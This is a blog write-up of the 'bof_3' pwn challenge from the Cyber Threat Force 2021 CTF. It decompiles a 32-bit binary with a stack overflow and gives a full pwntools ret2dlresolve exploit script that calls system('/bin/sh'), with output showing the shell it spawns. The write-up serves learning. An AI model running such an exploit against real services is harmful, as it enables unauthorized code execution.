<!doctype html><html lang=en>
<head>
<title>Writeup Cyber Threat Force : bof_3 :: Nicolas Bourras</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="For this challenge, we also were given a service executable. It was hosted remotely.
NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.
$ checksec ./service [*] &amp;#39;/home/vivescere/ctf/bof_3/service&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) $ ./service password: mypassword nop NX enabled, and partial RELRO. Let&amp;rsquo;s take a look at the binary using Ghidra:
undefined4 main(void) { ignorMe(&amp;amp;stack0x00000004); puts(&amp;#34;password: &amp;#34;); vuln(); puts(&amp;#34;nop&amp;#34;); return 0; } void vuln(void) { undefined local_70 [104]; read(0,local_70,0x96); return; } We have an overflow, but not much else going on.">
<meta name=keywords content>
<meta name=robots content="noodp">
<link rel=canonical href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-3/>
<link rel=stylesheet href=https://nicolasb.fr/assets/style.css>
<link rel=stylesheet href=https://nicolasb.fr/assets/pink.css>
<link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png>
<link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png>
<meta name=twitter:card content="summary">
<meta name=twitter:creator content>
<meta property="og:locale" content="en">
<meta property="og:type" content="article">
<meta property="og:title" content="Writeup Cyber Threat Force : bof_3">
<meta property="og:description" content="For this challenge, we also were given a service executable. It was hosted remotely.
NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.
$ checksec ./service [*] &amp;#39;/home/vivescere/ctf/bof_3/service&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) $ ./service password: mypassword nop NX enabled, and partial RELRO. Let&amp;rsquo;s take a look at the binary using Ghidra:
undefined4 main(void) { ignorMe(&amp;amp;stack0x00000004); puts(&amp;#34;password: &amp;#34;); vuln(); puts(&amp;#34;nop&amp;#34;); return 0; } void vuln(void) { undefined local_70 [104]; read(0,local_70,0x96); return; } We have an overflow, but not much else going on.">
<meta property="og:url" content="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-3/">
<meta property="og:site_name" content="Nicolas Bourras">
<meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">
<meta property="article:published_time" content="2021-07-08 02:12:09 +0100 +0100">
</head>
<body class=pink>
<div class="container center">
<header class=header>
<div class=header__inner>
<div class=header__logo>
<a href=/>
<div class=logo>
Nicolas Bourras
</div>
</a>
</div>
<div class=menu-trigger>menu</div>
</div>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/>About</a></li>
<li><a href=/blog>Blog</a></li>
<li><a href=/recipes>Recipes</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/>About</a></li>
<li><a href=/blog>Blog</a></li>
<li><a href=/recipes>Recipes</a></li>
</ul>
</nav>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>
<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-3/>Writeup Cyber Threat Force : bof_3</a></h1>
<div class=post-meta>
<span class=post-date>
2021-07-08
</span>
</div>
<span class=post-tags>
#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
#<a href=https://nicolasb.fr/tags/pwn/>pwn</a>&nbsp;
</span>
<div class=post-content><div>
<p>For this challenge, we also were given a service executable. It was hosted remotely.</p>
<p>NOTE: since I&rsquo;m writting this after the CTF ended, the demos are done locally.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ checksec ./service
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_3/service&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span style=color:#f92672>(</span>0x8048000<span style=color:#f92672>)</span>

$ ./service
password: 
mypassword
nop
</code></pre></div><p>NX enabled, and partial RELRO. Let&rsquo;s take a look at the binary using Ghidra:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>undefined4 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
  ignorMe(<span style=color:#f92672>&amp;</span>stack0x00000004);
  puts(<span style=color:#e6db74>&#34;password: &#34;</span>);
  vuln();
  puts(<span style=color:#e6db74>&#34;nop&#34;</span>);
  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>vuln</span>(<span style=color:#66d9ef>void</span>) {
  undefined local_70 [<span style=color:#ae81ff>104</span>];
  
  read(<span style=color:#ae81ff>0</span>,local_70,<span style=color:#ae81ff>0x96</span>);
  <span style=color:#66d9ef>return</span>;
}
</code></pre></div><p>We have an overflow, but not much else going on. We won&rsquo;t be able to leak an address from the libc using a format string exploit, like on <a href=/blog/writeup-cyber-threat-force-2021-pwn-bof-2>the last challenge</a>.</p>
<p>We can try the <a href=https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve>ret2dlresolve</a> technique. Pwntools even has a nice module for it.</p>
<p>I found the offset using <code>cyclic</code> from pwntools.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>

exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./service&#34;</span>)

context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;konsole&#39;</span>, <span style=color:#e6db74>&#39;-e&#39;</span>]

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>conn</span>():
    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
        r <span style=color:#f92672>=</span> process([exe<span style=color:#f92672>.</span>path])
    <span style=color:#66d9ef>else</span>:
        r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;XXX.XXX.XXX.XXX&#39;</span>, <span style=color:#ae81ff>00000</span>)

    <span style=color:#66d9ef>return</span> r

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
    r <span style=color:#f92672>=</span> conn()
    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;:&#39;</span>)
    r<span style=color:#f92672>.</span>recvline()
    
    offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>112</span>

    rop <span style=color:#f92672>=</span> ROP(exe)
    dlresolve <span style=color:#f92672>=</span> Ret2dlresolvePayload(exe, symbol<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;system&#34;</span>, args<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;/bin/sh&#34;</span>])
    rop<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>0</span>, dlresolve<span style=color:#f92672>.</span>data_addr)
    rop<span style=color:#f92672>.</span>ret2dlresolve(dlresolve)
    raw_rop <span style=color:#f92672>=</span> rop<span style=color:#f92672>.</span>chain()

    r<span style=color:#f92672>.</span>sendline(flat({offset: bytes(rop)}))
    r<span style=color:#f92672>.</span>sendline(dlresolve<span style=color:#f92672>.</span>payload)
    r<span style=color:#f92672>.</span>interactive()

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
    main()
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ python solve.py LOCAL
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_3/service&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span style=color:#f92672>(</span>0x8048000<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Starting local process <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_3/service&#39;</span>: pid <span style=color:#ae81ff>846530</span>
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Loaded <span style=color:#ae81ff>10</span> cached gadgets <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;./service&#39;</span>
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Switching to interactive mode
$ pwd
/home/vivescere/ctf/bof_3
</code></pre></div><p>The flag is <code>CYBERTF{Zeroleak@nd_bruteF0rc3}</code>. It was in <code>/home/ctf/flag.txt</code>.</p>
<p>You can <a href=https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof3>view the sources on github</a> or <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p>
</div></div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Read other posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-privesc/>
<span class=button__icon>←</span>
<span class=button__text>Writeup Cyber Threat Force : PrivEsc</span>
</a>
</span>
<span class="button next">
<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/>
<span class=button__text>Writeup Cyber Threat Force : bof_2 (with PrivEsc)</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class=copyright>
<span>© 2021 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span>
</div>
</div>
</footer>
<script src=https://nicolasb.fr/assets/main.js></script>
<script src=https://nicolasb.fr/assets/prism.js></script>
</div>
</body>
</html>